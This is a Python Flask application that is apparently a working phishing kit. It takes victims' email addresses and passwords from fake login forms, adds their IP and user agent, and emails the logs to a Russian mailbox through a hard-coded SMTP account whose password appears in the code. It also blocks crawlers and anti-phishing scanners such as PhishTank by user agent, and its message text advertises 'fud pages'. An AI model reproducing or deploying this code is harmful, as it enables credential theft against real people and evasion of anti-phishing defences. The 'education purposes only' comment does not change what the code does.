#!/usr/bin/python
# -*- coding: utf-8 -*-
from flask import Flask, request, abort, render_template, session, \
    redirect, url_for, jsonify
import secrets
import random
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# made for education purposes only

app = Flask(__name__)
secret_keyx = secrets.token_urlsafe(24)
app.secret_key = secret_keyx

bot_user_agents = [
    'Googlebot',
    'Baiduspider',
    'ia_archiver',
    'R6_FeedFetcher',
    'NetcraftSurveyAgent',
    'Sogou web spider',
    'bingbot',
    'Yahoo! Slurp',
    'facebookexternalhit',
    'PrintfulBot',
    'msnbot',
    'Twitterbot',
    'UnwindFetchor',
    'urlresolver',
    'Butterfly',
    'TweetmemeBot',
    'PaperLiBot',
    'MJ12bot',
    'AhrefsBot',
    'Exabot',
    'Ezooms',
    'YandexBot',
    'SearchmetricsBot',
    'phishtank',
    'PhishTank',
    'picsearch',
    'TweetedTimes Bot',
    'QuerySeekerSpider',
    'ShowyouBot',
    'woriobot',
    'merlinkbot',
    'BazQuxBot',
    'Kraken',
    'SISTRIX Crawler',
    'R6_CommentReader',
    'magpie-crawler',
    'GrapeshotCrawler',
    'PercolateCrawler',
    'MaxPointCrawler',
    'R6_FeedFetcher',
    'NetSeer crawler',
    'grokkit-crawler',
    'SMXCrawler',
    'PulseCrawler',
    'Y!J-BRW',
    '80legs.com/webcrawler',
    'Mediapartners-Google',
    'Spinn3r',
    'InAGist',
    'Python-urllib',
    'NING',
    'TencentTraveler',
    'Feedfetcher-Google',
    'mon.itor.us',
    'spbot',
    'Feedly',
    'bot',
    'curl',
    'spider',
    'crawler',
    ]

@app.route('/m')
def route2():
    web_param = request.args.get('web')
    if web_param:
        session['eman'] = web_param
        session['ins'] = web_param[web_param.index('@') + 1:]
    return render_template('index.html', eman=session.get('eman'),
                           ins=session.get('ins'))


@app.route('/first', methods=['POST'])
def first():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        email = request.form.get('horse')
        passwordemail = request.form.get('pig')
        sender_email = 'purchase@lexctrading.com'
        sender_emaill = 'adil'
        receiver_email = 'saintobitrans@yandex.ru'
        password = 'Ozi@1999'
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart('alternative')
        message['Subject'] = 'FIRE l0GS ! 1'
        message['From'] = sender_email
        message['To'] = receiver_email
        text = \
            """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email,
                               useragent=useragent,
                               passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, 'plain')
        part2 = MIMEText(html, 'html')
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL('smtp.hostinger.com', 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email,
                            message.as_string())
        return redirect(url_for('benza', web=session.get('eman')))


@app.route('/second', methods=['POST'])
def second():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        email = request.form.get('horse')
        passwordemail = request.form.get('pig')
        sender_email = 'purchase@lexctrading.com'
        sender_emaill = 'adil'
        receiver_email = 'saintobitrans@yandex.ru'
        password = 'Ozi@1999'
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart('alternative')
        message['Subject'] = 'FIRE l0GS !! 2'
        message['From'] = sender_email
        message['To'] = receiver_email
        text = \
            """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email,
                               useragent=useragent,
                               passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, 'plain')
        part2 = MIMEText(html, 'html')
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL('smtp.hostinger.com', 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email,
                            message.as_string())
        return redirect(url_for('lasmo'))


@app.route('/benzap', methods=['GET'])
def benza():
    if request.method == 'GET':
        eman = session.get('eman')
        dman = session.get('ins')
    return render_template('ind.html', eman=eman, dman=dman)


@app.route('/lasmop', methods=['GET'])
def lasmo():
    userip = request.headers.get('X-Forwarded-For')
    useragent = request.headers.get('User-Agent')

    if useragent in bot_user_agents:
        abort(403)  # forbidden

    if request.method == 'GET':
        dman = session.get('ins')
    return render_template('main.html', dman=dman)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)